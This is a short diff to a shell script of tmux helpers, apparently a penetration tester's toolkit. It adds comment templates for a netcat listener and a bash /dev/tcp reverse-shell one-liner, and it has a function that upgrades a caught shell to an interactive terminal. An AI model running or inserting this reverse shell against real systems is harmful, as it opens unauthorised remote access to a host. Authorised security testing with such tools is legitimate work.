@@ -51,8 +51,9 @@ tm_compare(){
     tmux send-keys -t clean:2.2 ranger Space \"$target2\" Enter
 }
 
+# nc -nlvp %port%
+# bash -i >& /dev/tcp/%ip%/%port% 0>&1
 tm_sanitize_bash(){
-    tmux send-keys -t .1 'nc -nlvp port' 'Enter'
     tmux send-keys -t .1 'script /dev/null -c bash' 'Enter'
     tmux send-keys -t .1 'python -c "import pty; pty.spawn(' "'" '/bin/bash' "'" ')"' 'Enter'
     tmux send-keys -t .1 'C-z'
@@ -63,3 +64,4 @@ tm_sanitize_bash(){
     tmux send-keys -t .1 'stty size' 'Enter'
     tmux send-keys -t .1 'stty rows 20 columns 200' 'Enter'
 }
+
